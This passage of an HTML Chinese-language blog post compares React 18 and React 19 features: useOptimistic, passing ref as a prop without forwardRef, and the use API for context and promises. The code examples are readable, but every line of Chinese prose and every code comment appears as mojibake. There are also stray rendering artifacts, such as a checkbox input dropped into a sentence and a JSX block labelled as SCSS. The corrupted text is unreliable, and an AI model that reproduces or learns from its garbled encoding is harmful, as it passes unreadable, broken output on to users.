<p>æ¶ˆå¤±äº†ï¼š <code>å¯¹â€œè¯·æ±‚æ˜¯å¦ç»“æŸâ€çš„æ‰‹åŠ¨åˆ¤æ–­ã€‚</code></p>
</li>
</ul>
<p>ä¸ºä»€ä¹ˆä»¥å‰æˆ‘ä»¬æ€»æ˜¯åœ¨å†™é‡å¤çš„ useState(false)ï¼Ÿå› ä¸º React 18 åªè´Ÿè´£æ¸²æŸ“ï¼Œä¸è´Ÿè´£è·Ÿè¸ªä½ çš„å¼‚æ­¥ä»»åŠ¡ã€‚è€Œ React 19 çš„ Actions æœºåˆ¶ï¼Œè®©æ¡†æ¶å¼€å§‹â€˜ç†è§£â€™å¼‚æ­¥ä»»åŠ¡çš„ç”Ÿå‘½å‘¨æœŸï¼Œä»è€ŒæŠŠå¼€å‘è€…ä»é‡å¤çš„çŠ¶æ€å®šä¹‰ä¸­è§£æ”¾å‡ºæ¥ã€‚</p>
<h3 data-id="heading-10">useOptimistic</h3>
<p>useOptimisticä¸»è¦è§£å†³ä¹è§‚æ›´æ–°çš„é—®é¢˜ã€‚</p>
<p><strong>react18çš„ä¹è§‚æ›´æ–°</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">LikeButton</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [likes, setLikes] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">100</span>); <span class="hljs-comment">// çœŸå®æ•°æ®</span>
  <span class="hljs-keyword">const</span> [error, setError] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleLike</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-comment">// 1. å¤‡ä»½æ—§æ•°æ®ï¼ˆä¸ºäº†å¤±è´¥æ—¶å›æ»šï¼‰</span>
    <span class="hljs-keyword">const</span> previousLikes = likes;

    <span class="hljs-comment">// 2. ç«‹å³æ›´æ–° UIï¼ˆä¹è§‚æ›´æ–°ï¼‰</span>
    <span class="hljs-title function_">setLikes</span>(likes + <span class="hljs-number">1</span>);

    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">await</span> <span class="hljs-title function_">updateLikeApi</span>(); <span class="hljs-comment">// å‘é€è¯·æ±‚</span>
    } <span class="hljs-keyword">catch</span> (e) {
      <span class="hljs-comment">// 3. å¤±è´¥å¤„ç†ï¼šæ‰‹åŠ¨æŠŠæ•°æ®æ”¹å›å»</span>
      <span class="hljs-title function_">setLikes</span>(previousLikes); 
      <span class="hljs-title function_">setError</span>(<span class="hljs-string">"æ›´æ–°å¤±è´¥ï¼Œå·²å›æ»š"</span>);
    }
  };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{handleLike}</span>&gt;</span>
      {likes} ğŸ‘ {error &amp;&amp; <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>{error}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>}
    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>
  );
}
</code></pre>
<p><strong>react19çš„ä¹è§‚æ›´æ–°</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { useOptimistic } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">LikeButton</span>(<span class="hljs-params">{ initialLikes }</span>) {
  <span class="hljs-comment">// 1. å®ƒæ˜¯åŸºäºåŸå§‹æ•°æ®çš„â€œæ´¾ç”ŸçŠ¶æ€â€</span>
  <span class="hljs-keyword">const</span> [optimisticLikes, addOptimisticLike] = <span class="hljs-title function_">useOptimistic</span>(
    initialLikes,
    <span class="hljs-function">(<span class="hljs-params">state, newLike</span>) =&gt;</span> state + <span class="hljs-number">1</span> <span class="hljs-comment">// å®šä¹‰å¦‚ä½•â€œä¹è§‚åœ°â€æ”¹å˜</span>
  );

  <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">handleLike</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 2. ç¬é—´æ”¹å˜ UI</span>
    <span class="hljs-title function_">addOptimisticLike</span>(<span class="hljs-number">1</span>);

    <span class="hljs-comment">// 3. å‘é€çœŸå®è¯·æ±‚ï¼ˆé…åˆ Actionsï¼‰</span>
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">updateLikeApi</span>();
    
    <span class="hljs-comment">// ã€å…³é”®ç‚¹ã€‘ï¼šå‡½æ•°æ‰§è¡Œå®Œï¼ŒReact è‡ªåŠ¨æŠŠ UI åŒæ­¥ä¸ºæœåŠ¡å™¨å›æ¥çš„çœŸå® initialLikes</span>
    <span class="hljs-comment">// å¼€å‘è€…ä¸éœ€è¦å†™ä»»ä½•â€œå›æ»šâ€ä»£ç ï¼</span>
  }

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{handleLike}</span>&gt;</span>{optimisticLikes} ğŸ‘<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>
  );
}
</code></pre>
<p>useOptimistic å¼•å…¥äº†ä¸€ç§ <strong>â€˜é˜…åå³ç„šâ€™çš„çŠ¶æ€ç®¡ç†æ¨¡å¼ã€‚å®ƒä¸å†éœ€è¦å¼€å‘è€…å»å†™å¤æ‚çš„åŒæ­¥é€»è¾‘ï¼Œè€Œæ˜¯é€šè¿‡ç›‘å¬å¼‚æ­¥å‡½æ•°çš„â€˜ç”Ÿå‘½å‘¨æœŸâ€™ï¼Œè‡ªåŠ¨å®Œæˆäº†ä»â€˜å¹»æƒ³â€™åˆ°â€˜ç°å®â€™çš„å¹³æ»‘åˆ‡æ¢ã€‚è¿™ç§ç»‘å®šä¸æ˜¯é€šè¿‡ä»£ç ç¡¬è¿çš„ï¼Œè€Œæ˜¯é€šè¿‡æ—¶é—´ç»´åº¦ï¼ˆå¼‚æ­¥æ‰§è¡Œçš„è¿‡ç¨‹ï¼‰</strong> è‡ªåŠ¨å…³è”çš„ã€‚</p>
<h2 data-id="heading-11">ä¸‰ã€ref ä¸å†éœ€è¦â€œä¸­é—´å•†â€ï¼šå†è§ forwardRef</h2>
<p>åœ¨ React 18 æ—¶ä»£ï¼Œå¦‚æœä½ æƒ³æŠŠ ref ä¼ é€’ç»™å­ç»„ä»¶ï¼Œä½ å¿…é¡»ä½¿ç”¨ forwardRef åŒ…è£¹å­ç»„ä»¶ã€‚è¿™æ˜¯ React ä¸­æœ€ä»¤äººåæ„Ÿçš„â€œæ¨¡æ¿ä»£ç â€ä¹‹ä¸€ï¼Œå†™æ³•æå…¶æ‹—å£ã€‚</p>
<p><strong>React 18 çš„ç—›è‹¦å†™æ³•</strong></p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">MyInput</span> = <span class="hljs-title function_">forwardRef</span>(<span class="hljs-function">(<span class="hljs-params">props, ref</span>) =&gt;</span> {
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> {<span class="hljs-attr">...props</span>} <span class="hljs-attr">ref</span>=<span class="hljs-string">{ref}</span> /&gt;</span></span>;
});
</code></pre>
<p>React 19 çš„ç®€æ´å†™æ³•ï¼š ref ç°åœ¨å¯ä»¥åƒ idã€className ä¸€æ ·ä½œä¸ºæ™®é€šçš„ prop ä¼ é€’ã€‚</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">MyInput</span>(<span class="hljs-params">{ placeholder, ref }</span>) {
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">{placeholder}</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">{ref}</span> /&gt;</span></span>;
}
</code></pre>
<p>è¿™ä¸€æ”¹åŠ¨æŠ¹å¹³äº† ref ä¸æ™®é€šå±æ€§ä¹‹é—´çš„å·®å¼‚ï¼Œç»„ä»¶çš„ç»“æ„å˜å¾—æ›´åŠ æ‰å¹³ã€ç›´è§‚ã€‚</p>
<h3 data-id="heading-12">ä¸ºä»€ä¹ˆä¹‹å‰çš„è®¾è®¡è¦æ±‚ä½¿ç”¨forwardRefï¼Ÿ</h3>
<h4 data-id="heading-13">1. è¯­ä¹‰å†²çªï¼šè°æ‰æ˜¯ ref çš„ä¸»äººï¼Ÿ</h4>
<p><strong>åœ¨ React çš„æ—©æœŸè®¾è®¡ä¸­ï¼Œref çš„è¯­ä¹‰éå¸¸éœ¸é“ï¼šå®ƒæ°¸è¿œæŒ‡å‘â€œå½“å‰æ ‡ç­¾â€æ‰€å¯¹åº”çš„ç›´æ¥å®ä¾‹ã€‚</strong></p>
<ul>
<li>
<p>å¯¹äº<strong>åŸç”Ÿæ ‡ç­¾</strong>ï¼ˆå¦‚ <code>&lt;input /&gt;</code>ï¼‰ï¼šref æŒ‡å‘çœŸå®çš„ DOM èŠ‚ç‚¹ã€‚</p>
</li>
<li>
<p>å¯¹äº<strong>ç»„ä»¶æ ‡ç­¾</strong>ï¼ˆå¦‚ <code>&lt;MyComponent /&gt;</code>ï¼‰ï¼šref æŒ‡å‘è¯¥ç»„ä»¶çš„å®ä¾‹ï¼ˆInstanceï¼‰ã€‚</p>
</li>
</ul>
<p><strong>å¦‚æœæ²¡æœ‰ forwardRefï¼Œä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ å‡è®¾ä½ å†™äº† <code>&lt;MyInput ref={myRef} /&gt;</code>ï¼š</strong></p>
<ol>
<li>
<p>React å¼•æ“ä¼šè®¤ä¸ºï¼šä½ æƒ³æ‹¿åˆ° MyInput è¿™ä¸ªç»„ä»¶åŒ…è£…ç›’çš„å¼•ç”¨ã€‚</p>
</li>
<li>
<p>å¦‚æœ ref æ··åœ¨ props é‡Œï¼Œå­ç»„ä»¶å†…éƒ¨åˆæŠŠè¿™ä¸ª ref ä¼ ç»™äº†åº•å±‚çš„ <input type="checkbox" disabled="disabled"/>ã€‚</p>
</li>
<li>
<p>æ­¤æ—¶ç³»ç»Ÿå°±ä¹±äº†ï¼šåŒä¸€ä¸ª ref åˆ°åº•è¯¥æŒ‡å‘å¤–å±‚çš„ç»„ä»¶å®ä¾‹ï¼Œè¿˜æ˜¯é‡Œå±‚çš„ DOM èŠ‚ç‚¹ï¼Ÿ</p>
</li>
</ol>
<p><strong>ä¸ºäº†é¿å…è¿™ç§æŒ‡å‘ä¸æ˜çš„æ··ä¹±</strong>ï¼ŒReact å¼ºåˆ¶è§„å®šï¼šref ä¸å±äº propsï¼Œå®ƒå¿…é¡»ç”±æ¡†æ¶å±‚ç»Ÿä¸€è°ƒåº¦ã€‚</p>
<h4 data-id="heading-14">2. ç±»ç»„ä»¶æ—¶ä»£çš„â€œå®ä¾‹ä¿æŠ¤â€</h4>
<p>åœ¨ Hooks å‡ºç°ä¹‹å‰ï¼ŒReact ä¸»è¦æ˜¯ç±»ç»„ä»¶ã€‚</p>
<p>ç±»ç»„ä»¶æœ‰å†…éƒ¨çŠ¶æ€ã€æœ‰æ–¹æ³•ï¼ˆæ¯”å¦‚ this.myMethod()ï¼‰ã€‚é€šè¿‡ ref æ‹¿åˆ°ç»„ä»¶å®ä¾‹æ˜¯éå¸¸å¼ºå¤§çš„åŠŸèƒ½ã€‚</p>
<p>å¦‚æœ React å…è®¸ ref éš props ä¼ é€’ï¼Œå­ç»„ä»¶å¯èƒ½ä¼šä¸å°å¿ƒä¿®æ”¹æˆ–è¦†ç›–æ‰çˆ¶ç»„ä»¶ä¼ ä¸‹æ¥çš„ refã€‚</p>
<p><strong>forwardRefå¾ˆå¤§ç¨‹åº¦ä¸Šæ˜¯ä¸€ä»½â€œå…è´£å£°æ˜â€React å®˜æ–¹å½“æ—¶è§‰å¾—ï¼šâ€œè½¬å‘ Ref æ˜¯ä¸€ä»¶å¾ˆå±é™©çš„æ“ä½œï¼Œä¸èƒ½è®©ä½ éšéšä¾¿ä¾¿å°±åšäº†ã€‚â€äºæ˜¯å®ƒå¼ºåˆ¶è¦æ±‚ä½ å†™ forwardRefã€‚è¿™ä¸ªå¤æ‚çš„è¯­æ³•å®é™…ä¸Šæ˜¯åœ¨é€¼ä½ ç¡®è®¤ï¼šâ€œæˆ‘ï¼Œå¼€å‘è€…ï¼Œç°åœ¨æ˜ç¡®çŸ¥é“æˆ‘è¦æŠŠçˆ¶ç»„ä»¶çš„æ§åˆ¶æƒï¼ˆRefï¼‰äº¤ç»™å­ç»„ä»¶å¤„ç†äº†ã€‚å¦‚æœå­ç»„ä»¶ä¹±æï¼Œæˆ–è€…æŒ‡å‘å‡ºé”™äº†ï¼Œæˆ‘è®¤äº†ã€‚â€</strong></p>
<p>å°† ref æŠ½ç¦»å‡ºæ¥ï¼Œé€šè¿‡ç‰¹æ®Šçš„ forwardRef æ¥å£ï¼Œå®é™…ä¸Šæ˜¯åœ¨å¼ºè¿«å¼€å‘è€…æ„è¯†åˆ°ï¼šâ€œæ³¨æ„ï¼Œä½ ç°åœ¨æ­£åœ¨æŠŠåŸæœ¬å±äºç»„ä»¶å¤–éƒ¨çš„æ§åˆ¶æƒï¼Œç©¿é€åˆ°ç»„ä»¶å†…éƒ¨ã€‚â€ è¿™æ˜¯ä¸€ç§æ˜¾å¼çš„å£°æ˜ï¼Œé˜²æ­¢å¼€å‘è€…æ— æ„ä¸­ç ´åäº†å°è£…æ€§ã€‚</p>
<h4 data-id="heading-15">3. æ€§èƒ½ä¸ä¸€è‡´æ€§</h4>
<p>React çš„åº•å±‚æœ‰ä¸€ä¸ªéå¸¸é«˜æ•ˆçš„ props æ¯”è¾ƒæœºåˆ¶ã€‚</p>
<p>props é€šå¸¸æ˜¯ä¸å¯å˜çš„çº¯æ•°æ®ã€‚</p>
<p>ref æ˜¯ä¸€ä¸ªå¯å˜å¯¹è±¡ï¼Œå…¶ current å±æ€§ä¼šéšç”Ÿå‘½å‘¨æœŸä¸æ–­å˜åŒ–ã€‚</p>
<p>å¦‚æœæŠŠè¿™ä¸ªâ€œå¤šåŠ¨â€çš„ ref å¡è¿› propsï¼Œä¼šå¯¼è‡´ React åœ¨åˆ¤æ–­ç»„ä»¶æ˜¯å¦éœ€è¦é‡æ¸²æŸ“æ—¶ï¼Œä¸å¾—ä¸å¯¹ ref åšç‰¹æ®Šé€»è¾‘åˆ¤æ–­ï¼Œå¢åŠ äº†åº•å±‚çš„å¤æ‚åº¦ã€‚</p>
<h4 data-id="heading-16">4.ä¸ºä»€ä¹ˆ React 19 ç°åœ¨åˆæ•¢åˆå›å»äº†ï¼Ÿ</h4>
<p>React 19 ä¹‹æ‰€ä»¥èƒ½å–æ¶ˆ forwardRefï¼Œæ˜¯å› ä¸ºä¸¤ä¸ªç¯å¢ƒå˜äº†ï¼š</p>
<p>å‡½æ•°ç»„ä»¶æˆä¸ºç»å¯¹ä¸»æµï¼šå‡½æ•°ç»„ä»¶æ²¡æœ‰â€œå®ä¾‹â€ã€‚è¿™æ„å‘³ç€å½“ä½ å†™ <code>&lt;MyComponent ref={myRef} /&gt;</code> æ—¶ï¼Œé™¤éä½ æ‰‹åŠ¨è½¬å‘ï¼Œå¦åˆ™<strong>è¿™ä¸ª ref æ ¹æœ¬æ²¡ä¸œè¥¿å¯ç»‘ã€‚æ—¢ç„¶æ²¡ä¸œè¥¿ç»‘ï¼Œé‚£å°±ä¸å­˜åœ¨â€œè¯­ä¹‰å†²çªâ€äº†</strong>ã€‚</p>
<p>ç¼–è¯‘å™¨å˜èªæ˜äº†ï¼š<strong>React Compiler ç°åœ¨å¯ä»¥ç²¾å‡†åœ°è¿½è¸ª ref çš„å»å‘ã€‚æ—¢ç„¶å·¥å…·èƒ½æå®šï¼Œå°±æ²¡å¿…è¦è®©ç¨‹åºå‘˜æ‰‹å†™é‚£ä¸€å±‚è¹©è„šçš„åŒ…è£¹å‡½æ•°äº†ã€‚</strong></p>
<p>forwardRef çš„æ¶ˆå¤±ï¼Œ<strong>æœ¬è´¨ä¸Šæ˜¯ React ä»â€˜ä¿æŠ¤ç»„ä»¶å®ä¾‹â€™è½¬å‘â€˜æ‹¥æŠ±å‡½æ•°å¼çº¯å‡€â€™çš„æœ€åä¸€æ­¥</strong>ã€‚</p>
<p>è¿‡å»ï¼ŒReact åƒä¸€ä¸ªä¸¥å‰çš„å®¶é•¿ï¼Œæ‹…å¿ƒæˆ‘ä»¬å°† ref ä¹±ä¼ å¯¼è‡´æŒ‡å‘æ··ä¹±ï¼Œæ‰€ä»¥è®¾ç½®äº† forwardRef è¿™ä¸ªé—¨æ§›ã€‚</p>
<p>å¦‚ä»Šï¼Œåœ¨å‡½æ•°ç»„ä»¶å’Œç¼–è¯‘å™¨çš„åŒé‡æŠ¤èˆªä¸‹ï¼ŒReact ç»ˆäºç›¸ä¿¡å¼€å‘è€…å¯ä»¥å¤„ç†å¥½ ref ä¸ props çš„å…³ç³»ã€‚è¿™ä¸ªâ€˜é—¨æ§›â€™çš„æ‹†é™¤ï¼Œè®© React çš„ä»£ç çœ‹èµ·æ¥æ›´åƒæ˜¯ä¸€æ®µè‡ªç„¶çš„ã€æ¯«æ— æ¡†æ¶ç—•è¿¹çš„ JavaScript ä»£ç ã€‚</p>
<h2 data-id="heading-17">å››ã€use Hook</h2>
<p>React 19 å¼•å…¥çš„ use å®é™…ä¸Šæ˜¯ Hooks çš„ <strong>â€œå¢å¼ºç‰ˆâ€</strong> ã€‚å®ƒæœ€å¤§çš„çªç ´å°±æ˜¯ï¼šå®ƒå¯ä»¥åœ¨æ¡ä»¶è¯­å¥å’Œå¾ªç¯ä¸­è¿è¡Œã€‚</p>
<p>æ³¨ï¼šuseå¹¶ä¸æ˜¯ä¸€ä¸ªhookï¼Œåªæ˜¯ä¸€ä¸ªAPI</p>
<h3 data-id="heading-18">1.react18çš„contexté—®é¢˜</h3>
<p>åœ¨react 18ä¸­æœ‰ä¸€ä¸ªæ¯”è¾ƒå¤§çš„å¼Šç«¯ï¼Œé‚£å°±æ˜¯hookåªèƒ½åœ¨ç»„ä»¶çš„é¡¶å±‚å»å®šä¹‰ï¼Œè€Œä¸”ä¸å¯ä»¥æ”¾åœ¨æ¡ä»¶åˆ¤æ–­æˆ–è€…å¾ªç¯ä¸­å»ä½¿ç”¨ã€‚</p>
<p>å‡è®¾ä½ æœ‰ä¸€ä¸ªæƒé™ç³»ç»Ÿï¼Œåªæœ‰ç®¡ç†å‘˜ï¼ˆAdminï¼‰æ‰éœ€è¦è¯»å–ä¸€ä¸ªå·¨å¤§çš„ PermissionsContextã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Dashboard</span>(<span class="hljs-params">{ isAdmin }</span>) {
  <span class="hljs-comment">// å³ä½¿ isAdmin ä¸º falseï¼Œä½ ä¹Ÿå¿…é¡»åœ¨é¡¶å±‚è°ƒç”¨å®ƒ</span>
  <span class="hljs-comment">// è¿™æ„å‘³ç€æ¯ä¸ªæ™®é€šç”¨æˆ·éƒ½åœ¨è®¢é˜…è¿™ä¸ªåºå¤§çš„ä¸Šä¸‹æ–‡</span>
  <span class="hljs-keyword">const</span> permissions = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">PermissionsContext</span>); 

  <span class="hljs-keyword">if</span> (!isAdmin) <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>æ™®é€šç”¨æˆ·ç•Œé¢<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span>;

  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">AdminPanel</span> <span class="hljs-attr">data</span>=<span class="hljs-string">{permissions}</span> /&gt;</span></span>;
}
</code></pre>
<p>æ€§èƒ½å¼€é”€ï¼šåœ¨ React ä¸­ï¼Œåªè¦ä½  useContextï¼Œé‚£ä¹ˆå½“ Context çš„å€¼å˜åŒ–æ—¶ï¼Œè¯¥ç»„ä»¶ä¸€å®šä¼šé‡æ–°æ¸²æŸ“ã€‚è¿™æ„å‘³ç€æˆåƒä¸Šä¸‡çš„æ™®é€šç”¨æˆ·ï¼Œä¼šå› ä¸ºä¸€ä¸ªä»–ä»¬æ ¹æœ¬ç”¨ä¸åˆ°çš„â€œç®¡ç†å‘˜æƒé™æ•°æ®â€æ›´æ–°è€Œè¢«è¿«é‡æ–°æ¸²æŸ“ç»„ä»¶ã€‚</p>
<p>use æ‰“ç ´äº†â€œé¡¶å±‚é™åˆ¶â€ã€‚ä½ å¯ä»¥æŠŠè®¢é˜…é€»è¾‘è—åœ¨é€»è¾‘åˆ¤æ–­é‡Œï¼š</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Dashboard</span>(<span class="hljs-params">{ isAdmin }</span>) {
  <span class="hljs-keyword">if</span> (isAdmin) {
    <span class="hljs-comment">// åªæœ‰å½“ç¨‹åºè¿è¡Œåˆ°è¿™é‡Œæ—¶ï¼ŒReact æ‰ä¼šå»ºç«‹ç»„ä»¶ä¸ Context çš„è®¢é˜…å…³ç³»</span>
    <span class="hljs-keyword">const</span> permissions = <span class="hljs-title function_">use</span>(<span class="hljs-title class_">PermissionsContext</span>); 
    <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">AdminPanel</span> <span class="hljs-attr">data</span>=<span class="hljs-string">{permissions}</span> /&gt;</span></span>;
  }
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>æ™®é€šç”¨æˆ·ç•Œé¢<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span>;
}
</code></pre>
<p>ä¼˜åŒ–ç»“æœï¼šå¯¹äºéç®¡ç†å‘˜ï¼ŒReact æ ¹æœ¬ä¸ä¼šæŠŠè¿™ä¸ªç»„ä»¶æŒ‚è½½åˆ° PermissionsContext çš„ç›‘å¬é˜Ÿåˆ—é‡Œã€‚è¿™å®ç°äº†çœŸæ­£çš„â€œé€»è¾‘æŒ‰éœ€åŠ è½½â€ã€‚</p>
<h3 data-id="heading-19">2.ç›´æ¥å¤„ç†å¼‚æ­¥ â€”â€” æ¸²æŸ“é€»è¾‘çš„â€œåŒæ­¥åŒ–â€</h3>
<p><strong>React å›¢é˜Ÿå¸Œæœ›å¼€å‘è€…è¯»å–æ•°æ®ï¼ˆæ— è®ºæ˜¯ Context è¿˜æ˜¯ Promiseï¼‰æ—¶ï¼Œèƒ½åƒè¯»å–æ™®é€šå˜é‡ä¸€æ ·è‡ªç„¶ï¼Œè€Œä¸æ˜¯éè¦åŒ…ä¸€å±‚ useEffectã€‚</strong></p>
<p>è¿™æ˜¯ React 19 æœ€å…·é©å‘½æ€§çš„å˜åŒ–ã€‚å®ƒè®©â€œå¼‚æ­¥å–æ•°æ®â€è¿™ä»¶äº‹ï¼Œåœ¨ä»£ç è§‚æ„Ÿä¸Šå˜æˆäº†â€œåŒæ­¥å–å˜é‡â€ã€‚</p>
<h4 data-id="heading-20">1. ä¼ ç»Ÿæ¨¡å¼ï¼šçŠ¶æ€çš„â€œä¸­é—´å•†â€</h4>
<p>åœ¨ä»¥å‰ï¼Œæ•°æ®æµæ˜¯æ–­è£‚çš„ï¼š</p>
<ol>
<li>
<p>æ¸²æŸ“ç»„ä»¶ï¼ˆæ˜¾ç¤º Loadingï¼‰ã€‚</p>
</li>
<li>
<p>useEffect å¯åŠ¨ï¼ˆå¼‚æ­¥æ‹¿æ•°æ®ï¼‰ã€‚</p>
</li>
<li>
<p>æ•°æ®å›æ¥ï¼ŒsetDataï¼ˆè§¦å‘äºŒæ¬¡æ¸²æŸ“ï¼‰ã€‚</p>
</li>
<li>
<p>å†æ¬¡æ¸²æŸ“ç»„ä»¶ï¼ˆæ˜¾ç¤ºæ•°æ®ï¼‰ã€‚ å¼€å‘è€…å¿…é¡»æ‰‹åŠ¨ç»´æŠ¤è¿™ä¸ªâ€œä¸­é—´çŠ¶æ€â€ã€‚</p>
</li>
</ol>
<h4 data-id="heading-21">2. React 19 use(Promise) æ¨¡å¼ï¼šæ•°æ®ç›´è¾¾</h4>
<p>use è®© React ç»„ä»¶å…·å¤‡äº†â€œç­‰å¾…â€çš„èƒ½åŠ›ã€‚å®ƒä¸å†éœ€è¦ä¸­é—´çŠ¶æ€å˜é‡ï¼Œè€Œæ˜¯ç›´æ¥æ·±åº¦é›†æˆåˆ° React çš„ Suspenseï¼ˆæ‚¬åœæœºåˆ¶ï¼‰ ä¸­ã€‚</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Message</span>(<span class="hljs-params">{ messagePromise }</span>) {
  <span class="hljs-comment">// 1. å¦‚æœ Promise è¿˜åœ¨ pendingï¼ŒReact æš‚åœå½“å‰ç»„ä»¶æ‰§è¡Œï¼Œç›´æ¥è·³å‡º</span>
  <span class="hljs-comment">// 2. æ­¤æ—¶ï¼Œå¤–å±‚çš„ &lt;Suspense&gt; æ•è·å¹¶æ˜¾ç¤º fallbackï¼ˆæ¯”å¦‚åŠ è½½åŠ¨ç”»ï¼‰</span>
  <span class="hljs-comment">// 3. å½“ Promise å®Œæˆï¼ˆResolvedï¼‰ï¼ŒReact è‡ªåŠ¨å›åˆ°è¿™é‡Œï¼ŒæŠŠç»“æœç»™åˆ° content</span>
  <span class="hljs-keyword">const</span> content = <span class="hljs-title function_">use</span>(messagePromise); 
  
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>{content}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span>;
}
</code></pre>
<p>æˆ‘ä»¬å¯ä»¥ä¸¾ä¸€ä¸ªä¾‹å­æ¥çœ‹</p>
<h5 data-id="heading-22">(1) React 18 çš„åšæ³•ï¼šç¹ççš„â€œå‰¯ä½œç”¨æ‰‹åŠ¨æŒ¡â€</h5>
<p>åœ¨ React 19 ä¹‹å‰ï¼Œå¼‚æ­¥è·å–æ•°æ®æ˜¯ä¸€åœºå…³äº useEffectã€useState å’Œâ€œæ—¶æœºç®¡ç†â€çš„åšå¼ˆã€‚</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// React 18 å…¸å‹å†™æ³•</span>
function <span class="hljs-built_in">UserProfile</span>({ userId }) {
  const <span class="hljs-selector-attr">[user, setUser]</span> = <span class="hljs-built_in">useState</span>(null);
  const <span class="hljs-selector-attr">[loading, setLoading]</span> = <span class="hljs-built_in">useState</span>(true);
  const <span class="hljs-selector-attr">[error, setError]</span> = <span class="hljs-built_in">useState</span>(null);

  <span class="hljs-built_in">useEffect</span>(() =&gt; {
    <span class="hljs-comment">// æ¯æ¬¡ userId å˜äº†ï¼Œéƒ½è¦æ‰‹åŠ¨é‡ç½®çŠ¶æ€</span>
    <span class="hljs-built_in">setLoading</span>(true);
    <span class="hljs-built_in">setError</span>(null);

    <span class="hljs-built_in">fetchUser</span>(userId)
      <span class="hljs-selector-class">.then</span>((data) =&gt; {
        <span class="hljs-built_in">setUser</span>(data); <span class="hljs-comment">// æ‰‹åŠ¨å­˜å…¥çŠ¶æ€</span>
      })
      <span class="hljs-selector-class">.catch</span>((err) =&gt; {
        <span class="hljs-built_in">setError</span>(err); <span class="hljs-comment">// æ‰‹åŠ¨å¤„ç†é”™è¯¯</span>
      })
      <span class="hljs-selector-class">.finally</span>(() =&gt; {
        <span class="hljs-built_in">setLoading</span>(false); <span class="hljs-comment">// æ‰‹åŠ¨å…³é—­åŠ è½½</span>
      });
  }, <span class="hljs-selector-attr">[userId]</span>); <span class="hljs-comment">// å¿…é¡»æ­»ç›¯ç€ä¾èµ–æ•°ç»„</span>

  if (loading) return &lt;<span class="hljs-selector-tag">div</span>&gt;åŠ è½½ä¸­...&lt;/<span class="hljs-selector-tag">div</span>&gt;;
  if (error) return &lt;<span class="hljs-selector-tag">div</span>&gt;å‡ºé”™äº†ï¼š{error<span class="hljs-selector-class">.message</span>}&lt;/<span class="hljs-selector-tag">div</span>&gt;;
  if (!user) return null;

  return &lt;<span class="hljs-selector-tag">h1</span>&gt;{user<span class="hljs-selector-class">.name</span>}&lt;/<span class="hljs-selector-tag">h1</span>&gt;;
}
</code></pre>
<p>ç—›ç‚¹æ€»ç»“ï¼š</p>
<ol>
<li>
<p>çŠ¶æ€å†—ä½™ï¼šä¸ºäº†æ˜¾ç¤ºä¸€ä¸ªæ•°æ®ï¼Œä½ é¢å¤–åˆ›å»ºäº† 3 ä¸ªçŠ¶æ€ï¼ˆuser, loading, errorï¼‰ã€‚</p>
</li>
<li>
<p>æµç¨‹æ”¯ç¦»ç ´ç¢ï¼šæ•°æ®è·å–é€»è¾‘è¢«è¿«å†™åœ¨ useEffect é‡Œï¼Œä¸ UI æ¸²æŸ“é€»è¾‘å®Œå…¨åˆ†ç¦»ã€‚</p>
</li>
<li>
